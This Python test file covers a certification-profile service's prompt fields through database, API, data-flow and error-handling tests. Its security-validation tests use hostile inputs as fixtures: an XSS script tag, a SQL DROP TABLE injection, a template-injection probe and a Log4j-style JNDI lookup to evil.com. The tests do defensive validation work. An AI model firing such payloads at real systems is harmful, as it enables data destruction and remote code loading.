"""
Comprehensive test suite for the prompt system functionality.
Tests current behavior to establish baseline before implementing prompt individuation.
"""

import pytest
import asyncio
from uuid import uuid4, UUID
from unittest.mock import AsyncMock, MagicMock, patch

# Import optional dependencies with graceful handling
try:
    from sqlalchemy.ext.asyncio import AsyncSession
    HAS_SQLALCHEMY = True
except ImportError:
    AsyncSession = None
    HAS_SQLALCHEMY = False

try:
    from fastapi.testclient import TestClient
    HAS_FASTAPI = True
except ImportError:
    TestClient = None
    HAS_FASTAPI = False

try:
    from httpx import AsyncClient
    HAS_HTTPX = True
except ImportError:
    AsyncClient = None
    HAS_HTTPX = False

# Import optional source modules with graceful handling
try:
    from src.models.certification import CertificationProfile
    from src.schemas.certification import CertificationProfileCreate, CertificationProfileUpdate
    from src.service.api.v1.endpoints.certifications import (
        create_certification_profile,
        get_certification_profile,
        update_certification_profile,
        list_certification_profiles
    )
    HAS_SOURCE_MODULES = True
except ImportError:
    HAS_SOURCE_MODULES = False


class TestPromptSystemBaseline:
    """Test current prompt system behavior to establish baseline."""

    def test_environment_setup(self):
        """Test that the basic test environment is properly configured."""
        import sys
        import os

        # Basic environment checks
        assert sys.version_info >= (3, 8), "Python 3.8+ required"
        assert os.path.exists("tests"), "Tests directory exists"
        assert os.path.exists("src"), "Source directory exists"

        # Test that we can import basic modules
        import uuid
        import json
        from unittest.mock import Mock

        # Verify test file structure
        assert os.path.exists("PROMPT_SYSTEM_TEST_PLAN.md"), "Test plan exists"
        assert os.path.exists("PROMPT_INDIVIDUATION_PLAN.md"), "Individuation plan exists"

        print("✅ Environment setup test passed")

    # Test data scenarios
    PROMPT_TEST_CASES = [
        {
            "name": "normal_text",
            "assessment_prompt": "Generate assessment questions for AWS certification.",
            "presentation_prompt": "Create presentation slides for AWS learning.",
            "gap_analysis_prompt": "Analyze AWS knowledge gaps and provide recommendations."
        },
        {
            "name": "long_text",
            "assessment_prompt": "A" * 1000,  # Test large text handling
            "presentation_prompt": "B" * 500,
            "gap_analysis_prompt": "C" * 800
        },
        {
            "name": "special_characters",
            "assessment_prompt": "Test with 'quotes', \"double quotes\", and {braces}",
            "presentation_prompt": "Unicode: 你好 🌟 café naïve résumé",
            "gap_analysis_prompt": "JSON: {\"key\": \"value\", \"array\": [1, 2, 3]}"
        },
        {
            "name": "empty_values",
            "assessment_prompt": None,
            "presentation_prompt": "",
            "gap_analysis_prompt": "   "  # Whitespace only
        },
        {
            "name": "multiline_text",
            "assessment_prompt": """
            Line 1 of prompt
            Line 2 with formatting

            Line 4 after blank line
            """,
            "presentation_prompt": "Single line prompt",
            "gap_analysis_prompt": "Another\\nmultiline\\nprompt"
        }
    ]

    @pytest.fixture
    def sample_certification_data(self):
        """Sample certification profile data for testing."""
        return {
            "name": "AWS Solutions Architect Associate",
            "version": "SAA-C03",
            "provider": "AWS",
            "description": "AWS Solutions Architect certification",
            "exam_code": "SAA-C03",
            "passing_score": 72,
            "exam_duration_minutes": 130,
            "question_count": 65,
            "exam_domains": [
                {
                    "name": "Design Resilient Architectures",
                    "weight_percentage": 30,
                    "topics": ["High availability", "Disaster recovery"]
                },
                {
                    "name": "Design Secure Architectures",
                    "weight_percentage": 30,
                    "topics": ["Identity management", "Network security"]
                },
                {
                    "name": "Design High-Performing Architectures",
                    "weight_percentage": 24,
                    "topics": ["Performance optimization", "Caching"]
                },
                {
                    "name": "Design Cost-Optimized Architectures",
                    "weight_percentage": 16,
                    "topics": ["Cost management", "Resource optimization"]
                }
            ],
            "prerequisites": ["AWS experience"],
            "recommended_experience": "1+ years AWS experience",
            "is_active": True
        }

    @pytest.fixture
    def mock_db_session(self):
        """Mock database session for testing."""
        if not HAS_SQLALCHEMY:
            pytest.skip("SQLAlchemy not available")
        session = AsyncMock(spec=AsyncSession)
        return session

    @pytest.fixture
    def mock_certification_profile(self):
        """Mock certification profile for testing."""
        if not HAS_SOURCE_MODULES:
            pytest.skip("Source modules not available")
        profile = MagicMock(spec=CertificationProfile)
        profile.id = uuid4()
        profile.name = "AWS Solutions Architect Associate"
        profile.version = "SAA-C03"
        profile.assessment_prompt = "Test assessment prompt"
        profile.presentation_prompt = "Test presentation prompt"
        profile.gap_analysis_prompt = "Test gap analysis prompt"
        profile.assessment_template = {
            "_metadata": {
                "provider": "AWS",
                "description": "AWS certification"
            },
            "_chromadb_prompts": {
                "assessment_prompt": "Template assessment prompt",
                "presentation_prompt": "Template presentation prompt",
                "gap_analysis_prompt": "Template gap analysis prompt"
            }
        }
        return profile


class TestPromptDatabaseOperations(TestPromptSystemBaseline):
    """Test prompt handling at the database layer."""

    @pytest.mark.asyncio
    async def test_create_profile_with_prompts(self, sample_certification_data, mock_db_session):
        """Test creating certification profile with prompt data."""
        # Add prompt data to sample data
        test_data = {
            **sample_certification_data,
            "assessment_prompt": "Custom assessment prompt",
            "presentation_prompt": "Custom presentation prompt",
            "gap_analysis_prompt": "Custom gap analysis prompt"
        }

        profile_create = CertificationProfileCreate(**test_data)

        with patch('src.service.api.v1.endpoints.certifications.CertificationProfile') as MockProfile:
            mock_profile = MagicMock()
            mock_profile.id = uuid4()
            mock_profile.assessment_prompt = test_data["assessment_prompt"]
            mock_profile.presentation_prompt = test_data["presentation_prompt"]
            mock_profile.gap_analysis_prompt = test_data["gap_analysis_prompt"]
            MockProfile.return_value = mock_profile

            # Mock database operations
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = None
            mock_db_session.add = MagicMock()
            mock_db_session.commit = AsyncMock()
            mock_db_session.refresh = AsyncMock()

            # Test profile creation
            result = await create_certification_profile(profile_create, mock_db_session)

            # Verify prompt fields are included
            assert hasattr(result, 'assessment_prompt')
            assert hasattr(result, 'presentation_prompt')
            assert hasattr(result, 'gap_analysis_prompt')

    @pytest.mark.parametrize("test_case", TestPromptSystemBaseline.PROMPT_TEST_CASES)
    @pytest.mark.asyncio
    async def test_prompt_text_variations(self, test_case, sample_certification_data, mock_db_session):
        """Test various prompt text scenarios."""
        test_data = {
            **sample_certification_data,
            **{k: v for k, v in test_case.items() if k != "name"}
        }

        profile_create = CertificationProfileCreate(**test_data)

        with patch('src.service.api.v1.endpoints.certifications.CertificationProfile') as MockProfile:
            mock_profile = MagicMock()
            mock_profile.id = uuid4()
            mock_profile.assessment_prompt = test_case.get("assessment_prompt")
            mock_profile.presentation_prompt = test_case.get("presentation_prompt")
            mock_profile.gap_analysis_prompt = test_case.get("gap_analysis_prompt")
            MockProfile.return_value = mock_profile

            mock_db_session.execute.return_value.scalar_one_or_none.return_value = None
            mock_db_session.add = MagicMock()
            mock_db_session.commit = AsyncMock()
            mock_db_session.refresh = AsyncMock()

            # Should not raise exceptions with various text formats
            result = await create_certification_profile(profile_create, mock_db_session)
            assert result is not None

    @pytest.mark.asyncio
    async def test_update_prompts_only(self, mock_db_session, mock_certification_profile):
        """Test updating only prompt fields."""
        profile_id = mock_certification_profile.id

        # Update data with only prompt changes
        update_data = CertificationProfileUpdate(
            assessment_prompt="Updated assessment prompt",
            presentation_prompt="Updated presentation prompt",
            gap_analysis_prompt="Updated gap analysis prompt"
        )

        with patch('src.service.api.v1.endpoints.certifications.select') as mock_select:
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = mock_certification_profile
            mock_db_session.commit = AsyncMock()
            mock_db_session.refresh = AsyncMock()

            result = await update_certification_profile(profile_id, update_data, mock_db_session)

            # Verify prompts were updated
            assert mock_certification_profile.assessment_prompt == "Updated assessment prompt"
            assert mock_certification_profile.presentation_prompt == "Updated presentation prompt"
            assert mock_certification_profile.gap_analysis_prompt == "Updated gap analysis prompt"


class TestPromptAPIEndpoints(TestPromptSystemBaseline):
    """Test prompt handling in API endpoints."""

    @pytest.mark.asyncio
    async def test_get_profile_includes_prompts(self, mock_db_session, mock_certification_profile):
        """Test that GET endpoint includes prompt fields."""
        profile_id = mock_certification_profile.id

        with patch('src.service.api.v1.endpoints.certifications.select'):
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = mock_certification_profile

            result = await get_certification_profile(profile_id, mock_db_session)

            # Verify response includes all prompt fields
            assert hasattr(result, 'assessment_prompt')
            assert hasattr(result, 'presentation_prompt')
            assert hasattr(result, 'gap_analysis_prompt')

            # Verify prompt values are returned (either from DB columns or template)
            assert result.assessment_prompt is not None
            assert result.presentation_prompt is not None
            assert result.gap_analysis_prompt is not None

    @pytest.mark.asyncio
    async def test_list_profiles_includes_prompts(self, mock_db_session, mock_certification_profile):
        """Test that LIST endpoint includes prompt fields."""
        with patch('src.service.api.v1.endpoints.certifications.select'):
            mock_db_session.execute.return_value.scalars.return_value.all.return_value = [mock_certification_profile]

            result = await list_certification_profiles(0, 10, mock_db_session)

            # Verify response is a list with prompt data
            assert isinstance(result, list)
            assert len(result) > 0

            profile = result[0]
            assert hasattr(profile, 'assessment_prompt')
            assert hasattr(profile, 'presentation_prompt')
            assert hasattr(profile, 'gap_analysis_prompt')

    @pytest.mark.asyncio
    async def test_prompt_response_consistency(self, mock_db_session, mock_certification_profile):
        """Test that prompt data is consistent across different endpoints."""
        profile_id = mock_certification_profile.id

        with patch('src.service.api.v1.endpoints.certifications.select'):
            # Mock database responses
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = mock_certification_profile
            mock_db_session.execute.return_value.scalars.return_value.all.return_value = [mock_certification_profile]

            # Get individual profile
            get_result = await get_certification_profile(profile_id, mock_db_session)

            # Get from list
            list_result = await list_certification_profiles(0, 10, mock_db_session)
            list_profile = list_result[0]

            # Verify prompt data is consistent
            assert get_result.assessment_prompt == list_profile.assessment_prompt
            assert get_result.presentation_prompt == list_profile.presentation_prompt
            assert get_result.gap_analysis_prompt == list_profile.gap_analysis_prompt


class TestPromptDataFlow(TestPromptSystemBaseline):
    """Test prompt data flow through the entire system."""

    @pytest.mark.asyncio
    async def test_prompt_persistence_lifecycle(self, sample_certification_data, mock_db_session):
        """Test complete prompt lifecycle: create → read → update → read."""
        # Step 1: Create with prompts
        initial_prompts = {
            "assessment_prompt": "Initial assessment prompt",
            "presentation_prompt": "Initial presentation prompt",
            "gap_analysis_prompt": "Initial gap analysis prompt"
        }

        create_data = CertificationProfileCreate(**{**sample_certification_data, **initial_prompts})

        mock_profile = MagicMock(spec=CertificationProfile)
        mock_profile.id = uuid4()

        with patch('src.service.api.v1.endpoints.certifications.CertificationProfile') as MockProfile:
            MockProfile.return_value = mock_profile
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = None
            mock_db_session.add = MagicMock()
            mock_db_session.commit = AsyncMock()
            mock_db_session.refresh = AsyncMock()

            # Set initial prompt values
            mock_profile.assessment_prompt = initial_prompts["assessment_prompt"]
            mock_profile.presentation_prompt = initial_prompts["presentation_prompt"]
            mock_profile.gap_analysis_prompt = initial_prompts["gap_analysis_prompt"]

            created_profile = await create_certification_profile(create_data, mock_db_session)

            # Step 2: Read and verify initial prompts
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = mock_profile
            retrieved_profile = await get_certification_profile(created_profile.id, mock_db_session)

            assert retrieved_profile.assessment_prompt == initial_prompts["assessment_prompt"]

            # Step 3: Update prompts
            updated_prompts = {
                "assessment_prompt": "Updated assessment prompt",
                "presentation_prompt": "Updated presentation prompt",
                "gap_analysis_prompt": "Updated gap analysis prompt"
            }

            update_data = CertificationProfileUpdate(**updated_prompts)

            # Update mock profile with new values
            mock_profile.assessment_prompt = updated_prompts["assessment_prompt"]
            mock_profile.presentation_prompt = updated_prompts["presentation_prompt"]
            mock_profile.gap_analysis_prompt = updated_prompts["gap_analysis_prompt"]

            updated_profile = await update_certification_profile(created_profile.id, update_data, mock_db_session)

            # Step 4: Read and verify updated prompts
            final_profile = await get_certification_profile(created_profile.id, mock_db_session)

            assert final_profile.assessment_prompt == updated_prompts["assessment_prompt"]
            assert final_profile.presentation_prompt == updated_prompts["presentation_prompt"]
            assert final_profile.gap_analysis_prompt == updated_prompts["gap_analysis_prompt"]

    def test_prompt_data_transformation(self):
        """Test prompt data transformation between layers."""
        # Test data that goes through form → proxy → API → database
        form_data = {
            "assessment_prompt": "Form assessment prompt",
            "presentation_prompt": "Form presentation prompt",
            "gap_analysis_prompt": "Form gap analysis prompt"
        }

        # Simulate proxy transformation (should preserve prompt data)
        proxy_data = {**form_data}  # Proxy should pass through prompt data

        # Simulate API validation (Pydantic should accept prompt fields)
        try:
            api_data = CertificationProfileUpdate(**proxy_data)
            assert api_data.assessment_prompt == form_data["assessment_prompt"]
            assert api_data.presentation_prompt == form_data["presentation_prompt"]
            assert api_data.gap_analysis_prompt == form_data["gap_analysis_prompt"]
        except Exception as e:
            pytest.fail(f"API validation failed for prompt data: {e}")


class TestPromptErrorHandling(TestPromptSystemBaseline):
    """Test error handling for prompt operations."""

    @pytest.mark.asyncio
    async def test_missing_profile_with_prompts(self, mock_db_session):
        """Test updating prompts on non-existent profile."""
        non_existent_id = uuid4()
        update_data = CertificationProfileUpdate(
            assessment_prompt="Test prompt"
        )

        with patch('src.service.api.v1.endpoints.certifications.select'):
            mock_db_session.execute.return_value.scalar_one_or_none.return_value = None

            with pytest.raises(Exception):  # Should raise HTTPException for 404
                await update_certification_profile(non_existent_id, update_data, mock_db_session)

    def test_invalid_prompt_data_types(self):
        """Test validation with invalid prompt data types."""
        invalid_cases = [
            {"assessment_prompt": 123},  # Number instead of string
            {"presentation_prompt": []},  # Array instead of string
            {"gap_analysis_prompt": {}},  # Object instead of string
        ]

        for invalid_data in invalid_cases:
            with pytest.raises(Exception):  # Should raise validation error
                CertificationProfileUpdate(**invalid_data)

    @pytest.mark.parametrize("field_name", ["assessment_prompt", "presentation_prompt", "gap_analysis_prompt"])
    def test_extremely_long_prompts(self, field_name):
        """Test handling of extremely long prompt text."""
        # Test with very long text (10MB+)
        very_long_text = "A" * 10_000_000

        update_data = {field_name: very_long_text}

        # Should either handle gracefully or raise appropriate validation error
        try:
            CertificationProfileUpdate(**update_data)
        except Exception as e:
            # If it raises an exception, it should be a clear validation error
            assert "too long" in str(e).lower() or "size" in str(e).lower()


class TestPromptSecurityValidation(TestPromptSystemBaseline):
    """Test security aspects of prompt handling."""

    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE certification_profiles; --",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com}",  # Log4j style injection
    ])
    def test_prompt_injection_protection(self, malicious_input):
        """Test that prompt fields handle potentially malicious input safely."""
        update_data = CertificationProfileUpdate(
            assessment_prompt=malicious_input,
            presentation_prompt=malicious_input,
            gap_analysis_prompt=malicious_input
        )

        # Should not raise exceptions (input should be treated as plain text)
        assert update_data.assessment_prompt == malicious_input
        assert update_data.presentation_prompt == malicious_input
        assert update_data.gap_analysis_prompt == malicious_input

    def test_prompt_unicode_handling(self):
        """Test proper Unicode handling in prompts."""
        unicode_cases = [
            "🌟 Star emoji and café naïve résumé",
            "中文字符测试",
            "العربية النص",
            "🔥💯🚀🎯✨",  # Multiple emojis
            "\u0000\u0001\u0002",  # Control characters
        ]

        for unicode_text in unicode_cases:
            update_data = CertificationProfileUpdate(assessment_prompt=unicode_text)
            assert update_data.assessment_prompt == unicode_text


# Integration test that can be run independently
if __name__ == "__main__":
    # Run basic smoke test
    print("Running prompt system smoke test...")

    # Test basic schema validation
    test_data = {
        "assessment_prompt": "Test assessment prompt",
        "presentation_prompt": "Test presentation prompt",
        "gap_analysis_prompt": "Test gap analysis prompt"
    }

    try:
        update_schema = CertificationProfileUpdate(**test_data)
        print("✅ Schema validation passed")

        # Test that all fields are present
        assert hasattr(update_schema, 'assessment_prompt')
        assert hasattr(update_schema, 'presentation_prompt')
        assert hasattr(update_schema, 'gap_analysis_prompt')
        print("✅ All prompt fields present in schema")

        # Test field values
        assert update_schema.assessment_prompt == test_data["assessment_prompt"]
        assert update_schema.presentation_prompt == test_data["presentation_prompt"]
        assert update_schema.gap_analysis_prompt == test_data["gap_analysis_prompt"]
        print("✅ Prompt field values correct")

        print("🎉 Prompt system smoke test PASSED")

    except Exception as e:
        print(f"❌ Prompt system smoke test FAILED: {e}")
        raise